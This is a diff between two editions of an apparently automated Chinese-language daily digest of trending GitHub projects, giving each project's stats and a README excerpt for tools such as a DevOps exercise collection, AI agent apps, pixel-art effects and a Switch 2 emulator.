@@ -1,396 +1,454 @@
-📊 开源日报 — 2026-10-31
-共发现 8 个新项目（已自动过滤历史记录）
+📊 开源日报 — 2026-11-01
+共发现 10 个新项目（已自动过滤历史记录）
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#1  Jakeschincariol/day-trader-skill
-    ⭐ 3706 stars  |  🍴 852 forks  |  💻 Python  |  📅 2026-10-20
-    🔗 https://github.com/Jakeschincariol/day-trader-skill
+#1  bregman-arie/devops-exercises
+    ⭐ 86138 stars  |  🍴 20560 forks  |  💻 Python  |  📅 2019-10-03
+    🔗 https://github.com/bregman-arie/devops-exercises
+    📡 来源: trending-daily
+    🏷️ ansible, aws, azure, coding, containers, devops, docker, git, interview, interview-questions
+    📝 Linux, Jenkins, AWS, SRE, Prometheus, Docker, Python, Ansible, Git, Kubernetes, Terraform, OpenStack, SQL, NoSQL, Azure, GCP, DNS, Elastic, Network, Virtualization. DevOps Interview Questions
+
+    README 摘要:
+    :information_source: &nbsp;This repo contains questions and exercises on various technical topics, sometimes related to DevOps and SRE
+    
+    :bar_chart: &nbsp;There are currently **2624** exercises and questions
+    
+    :warning: &nbsp;You can use these for preparing for an interview but most of the questions and exercises don't represent an actual interview. Please read FAQ page for more details
+    
+    :stop_sign: &nbsp;If you are interested in pursuing a career as DevOps engineer, learning some of the concepts mentioned here would be useful, but you should know it's not about learning all the topics and technologies mentioned in this repository
+    
+    :pencil: &nbsp;You can add more exercises by submitting pull requests :) Read about contribution guidelines here
+    
+    ****
+    
+      
+        DevOps
+        Git
+        Network
+        Hardware
+        Kubernetes
+      
+    
+      
+        Software Development
+        Python
+        Go
+        Perl
+        Regex
+      
+    
+      
+          Cloud
+          AWS
+          Azure
+          Google Cloud Platform
+          OpenStack
+      
+    
+      
+          Operating System
+          Linux
+          Virtualization
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#2  vorssaint/vorssaint-utils
+    ⭐ 32061 stars  |  🍴 1545 forks  |  💻 Swift  |  📅 2026-06-12
+    🔗 https://github.com/vorssaint/vorssaint-utils
+    📡 来源: trending-daily
+    🏷️ alt-tab, app-uninstaller, appkit, finder, free, keep-awake, mac-os, menu-bar, menubar, open-source
+    📝 Free and open-source macOS menu bar toolkit.
+
+    README 摘要:
+    Vorssaint
+    
+      One menu bar icon doing the job of a dozen paid Mac apps.
+      Install only what you use.
+    
+      Website ·
+      Install ·
+      Features ·
+      Privacy ·
+      Changelog ·
+      Contact ·
+      Discord
+    
+      
+      
+      
+      
+      
+    
+      
+        
+      
+    
+      For anything private, email
+      hello@vorssaint.com.
+    
+      
+      
+      
+    
+    Sponsors
+    
+      Help keep Vorssaint free and open source. Share your product with Mac users.
+    
+      
+        
+          
+          Your product here
+          Your logo · Your name · Your link
+          Become our first sponsor →
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#3  Orkas-AI/Orkas
+    ⭐ 6907 stars  |  🍴 420 forks  |  💻 JavaScript  |  📅 2026-04-29
+    🔗 https://github.com/Orkas-AI/Orkas
+    📡 来源: trending-daily
+    🏷️ agent-collaboration, agent-harness, agent-orchestration, agent-team, agent-workflow, ai-assistant, ai-automation, ai-employee, ai-productivity, ai-team
+    📝 Orkas is an open-source (MIT), local-first AI team for your desktop: a Commander turns your goal into to-dos and coordinates 16 built-in specialist agents plus Claude Code, Codex, OpenCode, OpenClaw and Hermes, with projects, scheduled automations and connectors. Free app for macOS & Windows; built-in models or your own keys.
+
+    README 摘要:
+    # Orkas
+    
+    **An open-source team of AI agents on your desktop — it turns your goals into finished work and keeps it moving.**
+    
+    Orkas is an open-source (MIT), local-first multi-agent desktop app — an AI assistant that works as a team. Tell the **Commander** what you need: it finishes many tasks on its own, and for bigger work it plans the steps and brings in specialist agents along with the coding and personal agents you already use — **Claude Code, Codex, OpenCode, OpenClaw and Hermes-Agent** — to work on it together.
+    
+    Orkas is built to keep a project moving, not just answer one prompt. A **project** holds the goal, rules, memory and files, so every new conversation picks up where the last one left off. **To-dos** split the work between people and agents, **Auto-advance** lets the team take on the next to-do by itself, and **scheduled automations** repeat routine work hourly, daily, weekly or monthly. All your data stays on your computer, and finished work comes back for your review — so you can trust Orkas with the ongoing work of your business.
+    
+    **⬇ Download Orkas for macOS & Windows** — free, with 500 credits for the built-in Orkas model, so you don't need an API key to start. Prefer your own keys? Claude · OpenAI · Gemini · DeepSeek · Kimi · GLM · Qwen · MiniMax · Doubao, or a local OpenAI-compatible endpoint.
+    
+    English · 简体中文
+    
+    ---
+    
+    https://github.com/user-attachments/assets/4f8b16c8-a192-45a4-b19f-80e8d02c3dab
+    
+    ---
+    
+    ## What the team delivers
+    
+    - **Videos, voice-overs and images** — VideoStudio, VoiceStudio, ImageStudio
+    - **Research reports, SEO audits and market analysis** — DeepResearcher, SeoGeoAgent, StockAnalyser
+    - **Posts, articles, newsletters and slide decks** — ContentWriter, PptMaker
+    - **Websites, UI and code** — UIDesigner, ProductDeveloper
+    - **Word, Excel, PowerPoint and PDF files** — OfficeWorker
+    - **E-commerce work** — product research, listings, review analysis, sales analysis and catalog changes, from five e-commerce agents
+    - **Complex work that takes several agents** — the Commander splits it up, hands each part to the right agent and combines the results; for example, market research that becomes a report, a slide deck and a launch video
+    
+    16 specialists ship with the app, each with its own skills, memory and tools. Browse 30+ agents in the agent marketplace, or describe the role you need and the Commander builds a custom agent for you.
+    
+    All 16 built-in agents
+    
+    | Area | Agent | What it delivers |
+    | --- | --- | --- |
+    | Research & analysis |
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#4  deepseek-ai/dsh-superagent-prototype
+    ⭐ 4071 stars  |  🍴 377 forks  |  💻 TypeScript  |  📅 2026-10-31
+    🔗 https://github.com/deepseek-ai/dsh-superagent-prototype
+    📡 来源: 🚀 5天300+星
+    📝 Towards a More Autonomous Agent System
+
+    README 摘要:
+    # dsh-superagent
+    
+    > **Research prototype for reference only, not an official DeepSeek product.** This code grew out of our team's day-to-day development work, with much of the engineering done by coding agents. Treat it as research code, not production-ready software. It may still contain bugs, and its coding style and engineering practices may be inconsistent. Review and adapt it before using it in your own environment.
+    >
+    > We have adapted it for publication, so it is not identical to our internal version or the implementation described in *Exploring Super-agent Design: Towards a More Autonomous Agent System*. Some designs discussed in the article are directions for future development and are not implemented in this prototype.
+    
+    dsh-superagent is a proactive coding agent for one GitHub repository, packaged as a bundle for DeepSeek Harness. It listens to GitHub and, optionally, Feishu. When someone allowed asks the agent for work, it opens a work item, works on it in its own agent session and directory, and answers in the original conversation, for example with a pull request. A web panel shows what needs a person.
+    
+    It is also a way of working with an agent: **take as little human attention as possible, and give as much value as possible.** An agent that can act for a whole team can also waste a whole team's attention, so it acts only when asked or when a rule the team wrote allows it, and speaks only when someone must act or can use a result. docs/000-philosophy.md explains the principle and what it asks of the operator.
+    
+    ## Setup
+    
+    Setup has many steps, so an agent does it with you. Ask your coding agent:
+    
+    > Read SETUP.md in this repository and set up dsh-superagent with me.
+    
+    It asks one short question at a time, shows the full plan once, and then installs and configures everything. SETUP.md is what it follows.
+    
+    ## Documentation
+    
+    Read the numbered documents in order; each builds only on the ones before it.
+    
+    - 000 Philosophy
+    - 001 Domain model
+    - 002 Authorization
+    - 003 Execution
+    - 004 Prompts
+    - 005 Panel
+    - 006 Deployment: manual setup, configuration, upgrades and troubleshooting
+    - 007 Architecture
+    - 008 Cookbook: adding a Source
+    
+    ## Development
+    
+    `pnpm check` runs the typecheck, the tests and the build.
+    
+    ## License
+    
+    MIT
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#5  ccch1mneyyy/dsh-Go
+    ⭐ 3880 stars  |  🍴 184 forks  |  💻 Dart  |  📅 2026-10-25
+    🔗 https://github.com/ccch1mneyyy/dsh-Go
     📡 来源: 🚀 两周800+星
-    🏷️ backtesting, claude, claude-skills, day-trading, stock-market
-    📝 11 Claude skills for day trading: scan thousands of charts, track breaking news, time every entry and exit, and replay every outcome before you risk a dollar.
+    🏷️ ai-agent, android, android-app, coding-agent, deepseek, deepseek-harness, dsh, dsh-plugin, dsh-tui, flutter
+    📝 dsh-go — DeepSeek Harness 装进口袋：手机本机运行，也能遥控你的电脑。
 
     README 摘要:
-    # The Day Trader skill
+    简体中文 · English
     
-    11 Claude skills for day trading: scan thousands of charts, track breaking news, time every entry and exit, and replay every outcome before you risk a dollar.
+      
+        
+        
+      
     
-    Free, MIT, no signup, no API key. The tools are plain Python that read free
-    public data: Yahoo Finance charts, Nasdaq Trader's symbol lists, SEC EDGAR
-    and the House Clerk.
+      DeepSeek Harness 的 Android 客户端。手机上直接跑，也能遥控你电脑上的 DSH。
     
-    One scans thousands of charts for setups. Another tracks breaking news on
-    every stock you watch. One watches a setup bar by bar and tells you the moment
-    to get in, and another sets your stop and your target before you do. And the
-    craziest one is the Time Machine: before you risk a dollar, it replays the
-    rest of the session 10,000 times from the stock's own recent bars, plus every
-    past day the same setup fired, and tells you the honest odds.
+      
+      
+      
+      
     
-    And no trade goes through until you say yes. Nothing in this pack can place
-    an order on its own. Paper trading is the default.
+    Deepy 和鲸娘，陪你干活
     
-    > **Looking for the original Trader skill?** Copy an investor's 13F, the
-    > stock screener, tax lots and rebalancing live in
-    > github.com/Jakeschincariol/trader-skill.
-    > This repo is its day-trading sequel: the Trader skill v2.
+    干活时敲代码，做完来个空翻，等你确认会举手。打开「App 外显示」，它们还会跟你到桌面。
     
-    ## Install
+         
     
-    Paste this into Claude:
+         
     
-    ```
-    https://github.com/Jakeschincariol/day-trader-skill
+    下载 DSH Go
     
-    install skill
-    ```
+    从 GitHub Releases 或官网下载页获取最新版 APK，常见手机选 arm64 包。
     
-    Or as a plugin, in Claude Code:
+      &emsp;
     
-    ```
-    /plugin marketplace add Jakeschincariol/day-trader-skill
-    /plugin install day-trader-skill@day-trader-skill
-    ```
+      感谢大家对 DSH Go 的支持和喜爱，我将尽快适配 iOS 和鸿蒙！大家 Star 点得越多，我适配得越快哦 hhh
     
+      
+    
+      第一次用可以先看使用指南，遇到问题欢迎来论坛和 QQ 群。
+      手机上装过签名不同的早期测试包时不能直接覆盖安装，需要先卸载旧版；卸载会清空对话、Linux 环境和设置。
+    
+    本机运行，也能遥控电脑
+    
+    内置 Linux 环境，免 Root、免 Termux。电脑上的 DSH，也能一键切过去接着用。
+    
+      
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#2  wangzan101/Mika
-    ⭐ 1784 stars  |  🍴 276 forks  |  💻 Kotlin  |  📅 2026-10-29
-    🔗 https://github.com/wangzan101/Mika
+#6  patch-gg/pixelfx
+    ⭐ 1744 stars  |  🍴 223 forks  |  💻 JavaScript  |  📅 2026-10-30
+    🔗 https://github.com/patch-gg/pixelfx
     📡 来源: 🚀 5天300+星
-    🏷️ accessibility, ai-agent, android, automation, jetpack-compose, kotlin, llm, mobile-agent
-    📝 Mika — 你手机上的私人 AI 助理，替你操作 App、上网、把事办成。An on-device AI agent for Android that operates apps and the web to get things done for you.
+    🏷️ agent-skills, animation, canvas, claude-code-plugin, gamedev, pixel-art, sprite-sheet, vfx
+    📝 244 pixel art effects, every one a small piece of code. Plus a Claude Code skill to make your own.
 
     README 摘要:
-    # Mika
+    # pixelfx.
     
-    简体中文 | English
+    **244 pixel art effects and animations, every one a small piece of code.** Fire,
+    explosions, magic, weather, UI, pickups, critters and more. Play them live, recolor and mirror them, drop them into
+    a browser game, or export sprite sheets for any engine. Plus a Claude Code skill that makes new ones the way a
+    picky pixel artist would: draft, render, look, refine.
     
-    **你手机上的私人 AI 助理，替你操作 App、上网、把事办成。**
+    Every effect that involves a character is **acted out**: he winds up, lets go, freezes on contact and recovers, and a
+    target takes the hit. Twelve whole moves chain the effects into attacks from wind-up to recovery.
     
-    它在一块看不见的后台屏上干活，你照样刷你的手机。
+    **open the gallery** · catalog · acting ·
+    the skill · make your own · how it works
     
-    An on-device AI agent for Android that operates apps and the web to get things done for you — on a hidden background screen, so you can keep using your phone.
+    The method is Hugo Duprez's, from How to make (good) pixel art effects with
+    Claude: code is clay, trust your
+    eyes, feed your references. His open-source effects at Sprite Fusion
+    set the bar, and `src/core/sim.js` and the effects that say so at the top adapt his code. This repo is our take on
+    the idea at library scale, with a skill to keep going.
     
-    下载 APK · 安装 · 快速开始 · 能做什么 · 常见问题 · 参与贡献
+    ## what's in it.
     
-    ## 安装
-    
-    **方式一：在手机上自己装**
-    
-    1. 从 Releases 下载最新的 APK，安装。
-    2. 打开 Mika 设置里的「设置手机操作」向导，配对一次无线调试（设置指南）。
-    3. 在设置里的「模型」添加服务商、填 API Key，或者用 ChatGPT 登录。
-    
-    每一步的细节见下文的快速开始。
-    
-    **方式二：让电脑上的 AI 助手帮你装**
-    
-    手机用数据线连上电脑，在手机上打开 USB 调试，然后把下面这句话发给电脑上能执行命令的 AI 助手：
-    
-    ```
-    请按 https://github.com/wangzan101/Mika/blob/main/docs/install-with-agent.md 的步骤，帮我把 Mika 安装到通过 USB 连着的安卓手机上。
-    ```
-    
-    它会检查手机、下载安装、打开需要的权限，需要你在手机上点的时候会停下来告诉你。API Key 由你自己在 Mika 里填，不经过它。
-    
-    **装好之后：让电脑上的 AI 工具直接用 Mika（MCP）**
-    
-    手机用数据线连着电脑，在电脑上运行：
-    
-    ```
-    adb shell sh /sdcard/Android/data/com.wangzan101.mika/files/connect-computer.sh
-    adb forward tcp:8765 tcp:8765
-    ```
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#3  heydamir/unslop
-    ⭐ 1608 stars  |  🍴 81 forks  |  💻 JavaScript  |  📅 2026-10-29
-    🔗 https://github.com/heydamir/unslop
-    📡 来源: 🚀 5天300+星
-    📝 A Claude skill that turns vibecoded, AI-looking UI into a designed interface
-
-    README 摘要:
-    # unslop
-    
-    Created by Damir Sokolovsky (@heydamir), who started the Unslopping series on X.
-    
-    unslop is a skill for Claude that turns vibecoded, AI-looking UI into a designed interface with its own character. It finds the slop first, the purple gradients, glows, emoji labels, shouty copy and uneven spacing, then sets a direction from your product and fixes the screen pass by pass like a designer doing a redline review. It works in whatever your screen is built with, like Next.js, React, Vue, Svelte, Tailwind or plain HTML and CSS, on dashboards, apps and landing pages, and even on a live site when all you have is a link.
-    
-    ## Install
-    
-    For Claude Code, copy the skill into your skills folder.
-    
-    ```bash
-    git clone https://github.com/heydamir/unslop
-    mkdir -p ~/.claude/skills && cp -r unslop/skills/unslop ~/.claude/skills/
-    ```
-    
-    For a single project, copy it into `.claude/skills/` inside that project instead.
-    
-    ## Use
-    
-    In Claude Code, type `/unslop` with what you want, or just ask in your own words and Claude picks the skill up by itself.
-    
-    ```
-    /unslop this dashboard
-    /unslop the hero of https://example.com
-    /unslop my landing page and make the story video so I can post it
-    ```
-    
-    It audits the screen and proposes a direction before it edits anything, so you can steer it early. If the screen is already good, it tells you so and suggests a few small refinements instead of redesigning it.
-    
-    ## What it does
-    
-    - **Audit.** Lists every sign of slop with where it lives.
-    - **Direction.** Character, world, the one or two moments that carry the color, and a signature detail, all taken from your product.
-    - **Passes.** Spacing, color, icons, copy, type, layout, details, visuals and motion, in that order.
-    - **Visuals.** Shows your product instead of a glossy blob. When a hero needs a scene or an object, it can generate one through an image service like fal, Replicate, OpenAI images or Higgsfield. If none is connected, it offers to connect one as an MCP server, and it shows the prompt and asks before every paid generation. Dashboards and apps rarely need one.
-    - **Story video.** A square video under 10 seconds of your screen unslopping itself, ready to post. It needs Playwright and ffmpeg.
-    
-    Try it on the two vibecoded screens in examples.
-    
-    ## Hire the unslopper
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#4  paipiange/nvzhuang
-    ⭐ 1381 stars  |  🍴 397 forks  |  💻 Go  |  📅 2026-10-29
-    🔗 https://github.com/paipiange/nvzhuang
-    📡 来源: 🚀 5天300+星
-    📝 1407 张 AI 女装参考图集与虚拟试穿网站，支持中英检索、OpenAI Images / Gemini / 豆包及自定义 Base URL、API Key、模型。https://github.com/paipiange/nvzhuang
-
-    README 摘要:
-    # 拍片哥女装 · AI 服装参考图集 (COSTUME-DB-01)
-    
-    一个深色主题的纯净服装参考图集网站，收录 **1407 张** 人物不入镜的 AI 生成服装图像（2:3 比例），支持中英文双语浏览、多维检索，并配备可选的 AI 一键换装试穿。
-    
-    > 👗 **【Linux.do 3级常任理事专属彩蛋】**  
-    > 听说在 LINUX DO 社区只要升到 **3 级（常任理事）** 就可以解锁“看女装大佬”的保留节目？身为一名尊贵的 Linux.do 3 级老兵，逛了一圈发现坛里的女装资源还不够看，干脆亲手搓了这个 **「拍片哥女装」** 项目！  
-    > 不仅收录了 1407 套纯净高质量服装图，还顺手接了 AI 虚拟换装后端——这下各位佬友哪怕现实中没有小裙子，直接传张自拍照就能一键无痛变身“女装大佬”出道了 😂！
-    
-    > 🔗 **在线预览**：https://paipiange.github.io/nvzhuang/  
-    > ⭐ **GitHub 源码**：https://github.com/paipiange/nvzhuang  
-    > 💃 **兄弟项目（AI 姿势参考与生图工坊）**：https://github.com/paipiange/ai-pose-gallery-zh  
-    > 💡 **原作者推文 / 灵感来源**：X @giaaibusi  
-    > 🐧 **社区友链**：LINUX DO (https://linux.do/)
-    
-    ## ⏱️ 10 秒了解本项目
-    
-    - 🆓 **免费使用（无需部署 / 无需 Key）**：1407 套 AI 服装参考图库浏览、分类筛选、中英双语双向检索、大图全屏查看、基础搭配台与同款跳转，由纯前端静态驱动，在线打开即可使用。
-    - ⚙️ **自选扩展（需自建后端 / 需自备 Key）**：真实 AI 试衣换装功能依赖 `backend/` 的 GoFrame 服务。需自行配置大模型（如 GPT Image 2、豆包 Seedream 或 Gemini）的 API Key 与 Base URL，调用将消耗对应的第三方模型配额。
-    - 📜 **完全可商用 · 免费开源**：基于 MIT License 全量开源，代码与图集资源完全开放，支持自由商用创作、设计参考及二次开发。详见 合规审计报告。
-    
-    ## 📸 预览
-    
-    | 中文模式 | 英文模式 | 关键词搜索 |
+    | category | effects | some of them |
     |---|---|---|
-    |  |  |  |
-    
-    ## 👗 AI 换装效果演示
-    
-    系统支持上传真实人像与选中的服装，通过 AI 生图大模型进行衣物迁移换装，实现精准保留面容、贴合人体形态的虚拟试穿效果：
-    
-    | ① 选中的服装（图 1） | ② 上传的模特照片（图 2） | ③ AI 换装合成效果（图 3） |
-    |:---:|:---:|:---:|
-    |  |  |  |
-    | **参考服装图**（图集中的精选女装） | **模特原图**（用户上传的人像日常照） | **AI 换装效果（图 1 + 图 2 ➔ 图 3）**（保留模特五官发型，自然融合服饰材质与剪裁） |
-    
-    ## 🎬 兄弟项目联动：姿势参考 + 人物参考 → AI 生成结果
-    
-    如果你不仅想为模特挑选服装，还希望**自由掌控人体的拍摄姿势、骨架动作与构图视角**，推荐搭配我的另一个开源项目一起使用：  
-    👉 **拍片哥 · AI 姿势参考库与生图工坊 (AI Pose Gallery & Studio)**
-    
+    | **moves** | 12 | arrow shot, dash strike, earth stomp, fireball throw, ground pound, holy smite… |
+    | **fire** | 12 | brazier, campfire, candle, fire breath, fire ring, fire tornado… |
+    | **explosions** | 12 | barrel explosion, big explosion, cartoon pow, dirt explosion, firework burst, firework rocket… |
+    | **water** | 12 | bubbles, drip, fountain, geyser, rain splash, ripples… |
+    | **ice** | 10 | blizzard vortex, freeze, frost breath, frost nova, ice crystal, ice lance… |
+    | **lightning** | 11 | ball lightning, chain lightning, charge up, electrified, lightning strike, plasma ball… |
+    | **sci-fi** | 12 | emp blast, energy core, force field, glitch, hologram, jetpack… |
+    | **melee** | 12 | claw swipe, dagger flurry, double slash, hammer smash, heavy cleave, scythe reap… |
+    | **impacts** | 11 | blunt hit, bullet impact, critical hit, ground slam, heavy landing, hit flash… |
+    | **projectiles** | 13 | arrow, bullet tracer, cannon shot, energy disc, signal flare, homing missile… |
+    | **spawn & death** | 10 | coin drop, disintegrate, dissolve burn, egg hatch, poof, respawn beam… |
+    | **arcane** | 12 | arcane beam, arcane missiles, arcane orb, blink in, blink out, magic circle cast… |
+    | **holy** | 10 | blessing, divine shield, feather burst, halo, heal, healing ring… |
+    | **shadow** | 12 | black hole, curse, dark explosion, eclipse, grasping hands, hex sigil… |
+    | **status** | 13 | bleeding,
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#5  lexifina/global-law
-    ⭐ 1125 stars  |  🍴 89 forks  |  💻 HTML  |  📅 2026-10-28
-    🔗 https://github.com/lexifina/global-law
+#7  Djihads80/Eglantine
+    ⭐ 1435 stars  |  🍴 182 forks  |  💻 C++  |  📅 2026-10-29
+    🔗 https://github.com/Djihads80/Eglantine
     📡 来源: 🚀 5天300+星
-    📝 Git for Global Law: the law of every country as one git history, each country's record a submodule, every commit one law taking effect
+    📝 VERY experimental Nintendo Switch 2 emulator
 
     README 摘要:
-    # Git for Global Law
+    Eglantine
+      
     
-    **The world's law in one git history. Every word traced to the law that wrote it for any country and any date.**
+    Eglantine is a free and opensource (FOSS) Switch 2 emulator, derived from Eden, Yuzu and Sudachi - started by developer Camille LaVey.
+    It's written in C++ with portability in mind, with builds for Windows, Linux and macOS
     
-    An expansion of the same for the US Code, #1 on Hacker News (28/10/26).
-    Semantic, searchable law on a global scale.
+        
+        
+            
+        
+      
     
-    https://github.com/user-attachments/assets/f24f3411-24d9-416a-8c45-9cebc817c64e
+      Compatibility |
+      Development |
+      Building |
+      Download |
+      Support |
+      License
     
-    **Free to use: CC0.** Fork it, build on it, ship it in a product: no permission or credit needed. The law text
-    sits in each country's repository, under that repository's own terms.
+    ## Compatibility
     
-    The law of many jurisdictions as one git history. Each jurisdiction's law is its own repository, where every commit
-    is one law taking effect, written by that law. This repository arranges those repositories by jurisdiction and
-    interleaves their histories in the order the changes took force, so a single commit here is the state of all of them on
-    one day.
+    The emulator is capable of running Mario Kart World at decent/full speed depending on specs and configurations, and Splatoon Raiders at variable performances
     
-    ```
-    global-law/
-    ├── manifest.json            every corpus: path, source repo, coverage, which trailer holds the in-force date
-    ├── jurisdiction.json        the world, and its children: 193 UN members, other territories with their own ISO code, and the EU
-    ├── germany/                 Germany (ISO code DE in its jurisdiction.json)
-    │   ├── SOURCES.md           where German law can be read, with what each source offers
-    │   └── bund/                federal law
-    │       └── acts/            submodule: the Grundgesetz since 1949 (grundgesetz/), every other federal act since 2019
-    ├── estonia/                 Estonia
-    │   └── national/acts/       submodule: Estonia's law history, from its corpus.json
-    ├── france/                  France: jurisdiction.json and SOURCES.md, no history yet
-    └── …                        every other country, the same way
-    ```
+    A list of supported games will be available in future. Please be patient.
     
-    Each country's law lives in its own repository, `lexifina/-law`, which says where it belongs here in a
-    `corpus.json` at its root. A country whose repository still holds only its sources (no law yet) has a folder with its
-    `jurisdiction.json` and `SOURCES.md`, and no submodule: only real law is pinned. Laws adopted but not yet in force stay
-    on each corpus's future branch; `main` here holds only what is in force by the build date.
+    ## Development
+    For development discussions, please join us on Discord
     
-    Corpora differ widely in reach. Some hold a country's whole statute book (Czechia, Spain, Switzerland, Georgia, Malta);
-    others hold a few acts, or a sample: the US corpus is nine titles of the United States Code, and the UK corpus is the
-    special educational needs law. `manifest.json` gives each corpus's `coverage`, and `history` says how it
+    If you would like to contribute, we are open to new developers and pull requests. Please ensure that your work is of a high standard and properly documented. You can also contact any of the developers on Discord or Stoat to learn more about the current state of the emulator.
+    
+    ## Documentation
+    
+    We have a user manual! See our User Handbook.
+    
+    ## Building
+    
+    See the General Build Guide
+    
+    For information on provided development tooling, see the Tools directory
+    
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#6  kevinraymond/florilegium
-    ⭐ 762 stars  |  🍴 18 forks  |  💻 Lua  |  📅 2026-10-30
-    🔗 https://github.com/kevinraymond/florilegium
-    📡 来源: 🚀 5天300+星
-    📝 Procedurally generated Delft-blue floral page margins for LuaLaTeX, drawn in Lua
+#8  ⚠️风险  unum-cloud/UForm
+    ⚠️ 命中风险词: poc —— 默认归排除区，需人工确认
+    ⭐ 1253 stars  |  🍴 76 forks  |  💻 Python  |  📅 2023-02-21
+    🔗 https://github.com/unum-cloud/UForm
+    📡 来源: 🤖 AI / LLM / RAG | 活跃 | AI image generation
+    🏷️ bert, clip, clustering, contrastive-learning, cross-attention, huggingface-transformers, image-search, language-vision, llava, multi-lingual
+    📝 Pocket-Sized Multimodal AI for content understanding and generation across multilingual texts, images, and 🔜 video, up to 5x faster than OpenAI CLIP and LLaVA 🖼️ & 🖋️
 
     README 摘要:
-    # florilegium
+    UForm
     
-    ## Origin
+    Pocket-Sized Multimodal AI
+    For Content Understanding and Generation
     
-    The Reddit post
-    asked how to make flowers like these in LaTeX. I don't know how the original was made, and
-    this project doesn't try to reproduce it. It is one possible way, and the way I did it:
-    hand-authored primitives with randomized parameters, painted in Lua, placed by a procedural
-    layout whose "fill the unused space" part borrows a 1998 idea from the ornament literature.
-    It gets a similar look.
+    &nbsp; &nbsp; &nbsp;
     
-    ## What it is
+    &nbsp; &nbsp; &nbsp;
     
-    Procedurally generated Delft-blue floral page margins for LaTeX. No images, no imported
-    paths, no external assets: every petal, leaf and stem is a parametric curve computed in Lua
-    while the page is being written, painted like a watercolor, and written straight into the
-    PDF. Every page gets its own garden.
+    &nbsp; &nbsp; &nbsp;
     
-    *Six seeds of the grown composition. Same code, different seed — and the garden fills
-    whatever space the text leaves free.*
+    &nbsp; &nbsp; &nbsp;
     
-    Two documents share one package, and two more (`showcase.tex`, `spread.tex`) show what
-    else it does:
+    Multimodal Embeddings from 64 to 768 Dimensions • 1B Parameter Chat
     
-    | | `florilegium.tex` | `florilegium-grow.tex` |
-    |---|---|---|
-    | composition | **authored**: stems, leaves and flowers placed by hand, every parameter sampled | **grown**: a plant grown to fit the page by a greedy space-filling loop |
-    | adapts to | nothing (tuned for A4, 68 mm margin) | the page layout, and the free space below the text on the last page |
-    | preview |  |  |
+    Short Texts • Images • 🔜 Video Clips • 🔜 Long Documents
     
-    Both PDFs are self-describing: the body text is the write-up of how the margin is drawn.
+    ONNX • CoreML • PyTorch
     
-    *Last page of the grown document: the text ends early, so branches arch into the space below.*
+    Python
+     • 
+    JavaScript
+     • 
+    Swift
     
-    *300 dpi crop. Mottled washes with white streaks lifted out, lobed leaves with white veins,
-    forget-me-not cymes, a pale ghost flower behind the stems.*
+    ---
     
-    ## Watch it grow
+    Welcome to UForm, a __multimodal__ AI library that's as versatile as it is efficient.
+    UForm tiny embedding models will help you understand and search visual and textual content across various languages.
+    UForm small generative models, on the other hand, don't only support conversational and chat use-cases, but are great for fast image captioning and Visual Question Answering (VQA).
+    With compact __custom pre-trained transformer models__, this can run anywhere from your server farm down to your smartphone.
     
-    | as it grows | with the free space it fills |
+    ## Features
+    
+    - __Tiny Embeddings__: 64-dimensional [Matryoshka][matryoshka]-style embeddings for extremely fast [search][usearch].
+    - __Throughput__: Thanks to the small size, the inference speed is 2-4x faster than competitors.
+    - __Portable__: Models come with native ONNX support, making them easy to deploy on any platform.
+    - __Quantization Aware__: Down-cast embeddings from `f32` to `i8` without losing much recall.
+    - __Multilingual__: Trained on a balanced dataset, the recall is great across over 20 languages.
+    
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#7  BryceYuuu/RUN
-    ⭐ 739 stars  |  🍴 44 forks  |  💻 Python  |  📅 2026-10-29
-    🔗 https://github.com/BryceYuuu/RUN
-    📡 来源: 🚀 5天300+星
-    📝 RUN · 润：海外移居手册（欧洲 36 国 · 110 条路线 · 主要移民地区）
+#9  glincker/awesome-selfhosted-ai
+    ⭐ 53 stars  |  🍴 6 forks  |  💻 JavaScript  |  📅 2026-10-31
+    🔗 https://github.com/glincker/awesome-selfhosted-ai
+    📡 来源: 🤖 AI / LLM / RAG | 新建 | AI image generation
+    🏷️ ai-agents, awesome, awesome-list, homelab, llm, local-ai, local-llm, mcp-server, ollama, open-source
+    📝 Curated list of self-hosted open-source AI: local LLMs, chat UIs, agents, MCP servers, RAG, speech and image generation. Health-checked weekly, dead projects removed automatically.
 
     README 摘要:
-    # RUN · 润
+    # Awesome Self-Hosted AI 
     
-    ### 一本海外移居手册
+    > Open-source AI you can run on your own hardware or server.
     
-    数字游民 · 技术移民 · 欧盟蓝卡 · 创业自雇 · 投资居留
+    308 projects across local LLMs, chat interfaces, agents, MCP servers, RAG, speech and image generation. A weekly job checks every project against the GitHub API, and anything archived, deleted or silent for over a year moves to UNMAINTAINED.md.
     
-    **🧭 我该走哪条路** ｜ **🌏 主要移民地区** ｜ **🇪🇺 欧洲 36 国** ｜ **📊 路线对比** ｜ **📑 文件准备**
+    **308** projects | **307** active in the last 90 days | **10.6M** combined stars | **0** unmaintained | refreshed 2026-10-31
     
-    > [!CAUTION]
-    > 本手册仅供信息参考，**不构成**移民、法律、税务或投资建议。2025–2026 年大量路线关闭或改规则，网上很多旧攻略已经失效——任何决定前请以各国官方页面为准。详见 免责声明。
+    See the live health table for stars, last push and license per project.
     
-    ---
+    ## Contents
     
-    ## 🚪 你是哪种情况？
+    - Agents and Automation (27)
+    - Chat Interfaces (11)
+    - Coding Assistants (24)
+    - Document AI and OCR (10)
+    - Fine-Tuning and Training (10)
+    - Home and Personal AI (13)
+    - Image and Video Generation (13)
